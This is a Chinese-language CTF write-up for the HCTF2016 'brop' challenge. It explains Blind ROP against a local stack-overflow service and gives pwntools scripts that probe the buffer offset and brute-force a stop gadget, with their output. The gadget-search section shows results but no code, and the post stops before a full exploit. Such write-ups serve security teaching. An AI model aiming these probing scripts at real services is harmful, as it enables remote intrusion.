---
layout: post
title: [blind rop]pwn HCTF2016 brop
excerpt: "HCTF2016 brop wirteup"
categories: [PWN writeup]
comments: true
---

在无源码无elf的情况下实现pwn

漏洞代码如下(攻击者无发看到)
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int i;
int check();
int main(void){
	setbuf(stdin,NULL);
	setbuf(stdout,NULL);
	setbuf(stderr,NULL);
    puts("WelCome my friend,Do you know password?");
	if(!check()){
        puts("Do not dump my memory");
	}else {
        puts("No password, no game");
	}
}
int check(){
    char buf[50];
    read(STDIN_FILENO,buf,1024);
    return strcmp(buf,"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}
```
编译
```shell
gcc -z noexecstack -fno-stack-protector  brop.c
```
checksec
```python
python
>>> from pwn import *
>>> print ELF('a.out').checksec()
[*] '/root/sploitfun/brop/a.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
架起服务
```
ncat -vc ./a.out -kl 127.0.0.1 4000
```
#### BROP 原理及题目解析
BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流，可用于开启了 ASLR、NX 和栈 canary 的 64-bit Linux。

实现这一攻击有两个必要条件：

- 目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它
- 目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使目标机器开启了 ASLR 也没有影响。

查看offset(竟然用这种方法)
```python
from pwn import *

def get_buffer_size():
    for i in range(100):
        payload = "A"
        payload += "A" * i
        buf_size = len(payload) - 1    #崩溃意味着我们覆盖到了返回地址，所以缓冲区应该是发送的字符数减一，即 buf(64)+ebp(8)=72
        try:
            p = remote('127.0.0.1', 4000)
            p.recvline()
            p.send(payload)
            p.recv()
            p.close()
            log.info("bad: %d" % buf_size)
        except EOFError as e:
            p.close()
            log.info("buffer size: %d" % buf_size)
            return buf_size

get_buffer_size()
```
结果
```
[+] Opening connection to 127.0.0.1 on port 4000: Done
[*] Closed connection to 127.0.0.1 port 4000
[*] buffer size: 72
```
##### stop gadget

在寻找通用 gadget 之前，我们需要一个 stop gadget。一般情况下，当我们把返回地址覆盖后，程序有很大的几率会挂掉，因为所覆盖的地址可能并不是合法的，所以我们需要一个能够使程序正常返回的地址，称作 stop gadget，这一步至关重要。stop gadget 可能不止一个，这里我们之间返回找到的第一个好了：
```python
from pwn import *


def get_stop_addr(buf_size):
   addr = 0x400000
   while True:
      sleep(0.1)
      addr += 1
      payload = "A" * buf_size
      payload += p64(addr)
      try:
         p = remote('127.0.0.1', 4000)
         p.recvline()
         p.sendline(payload)
         p.recvline()
         p.close()
         log.info("stop address: 0x%x" % addr)
         return addr
      except EOFError as e:
         p.close()
         log.info("bad: 0x%x" % addr)
      except:
         log.info("Can't connect")
         addr -= 1

get_stop_addr(72)
```
最后结果
```
[*] Closed connection to 127.0.0.1 port 4000
[*] stop address: 0x400565
```
##### common gadget

有了 stop gadget，那些原本会导致程序崩溃的地址还是一样会导致崩溃，但那些正常返回的地址则会通过 stop gadget 进入被挂起的状态。下面我们就可以寻找其他可利用的 gadget，由于是 64 位程序，可以考虑使用通用 gadget


最后结果
```
[*] find address: 0x400567
[+] Opening connection to 127.0.0.1 on port 4000: Done
[*] Closed connection to 127.0.0.1 port 4000
[*] bad address: 0x400567
```